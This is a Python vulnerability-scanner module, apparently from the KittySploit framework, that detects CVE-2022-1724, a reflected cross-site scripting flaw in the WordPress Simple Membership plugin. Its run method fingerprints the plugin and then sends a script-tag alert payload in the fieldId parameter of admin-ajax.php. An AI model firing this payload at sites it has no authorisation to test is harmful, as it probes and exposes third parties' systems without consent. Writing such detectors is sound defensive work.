#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Simple Membership plugin before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Simple Membership <4.1.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Simple Membership plugin before 4.1.1 contains a reflected cross-site scripting vulnerability. It does not properly sanitize and escape parameters before outputting them back in AJAX actions.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'wp', 'wordpress', 'wpscan', 'wp-plugin', 'simple-membership-plugin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/96a0a667-9c4b-4ea6-b78a-0681e9a9bbae',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1724',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/cyllective/CVEs',
        ],
        'cve': 'CVE-2022-1724',
    }

    def run(self):
        path = '/wp-content/plugins/simple-membership/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Simple Membership', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-admin/admin-ajax.php?action=swpm_validate_email&fieldId=%22%3Cscript%3Ealert(document.domain)%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"<script>alert(document.domain)</script>",',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Simple Membership <4.1.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

